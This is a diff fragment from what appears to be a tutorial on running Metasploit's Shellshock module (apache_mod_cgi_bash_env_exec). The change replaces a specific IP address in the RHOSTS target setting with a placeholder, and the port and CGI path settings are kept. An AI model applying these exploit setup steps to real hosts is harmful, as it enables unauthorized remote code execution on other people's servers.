@@ -10,7 +10,7 @@ use exploit/multi/http/apache_mod_cgi_bash_env_exec
 
 **2. Configure the Target (The "Setup" Phase)**
 ```bash
-set RHOSTS 44.220.130.181
+set RHOSTS <IP ADDRESS >
 set RPORT 8080
 set TARGETURI /cgi-bin/vulnerable
 ```
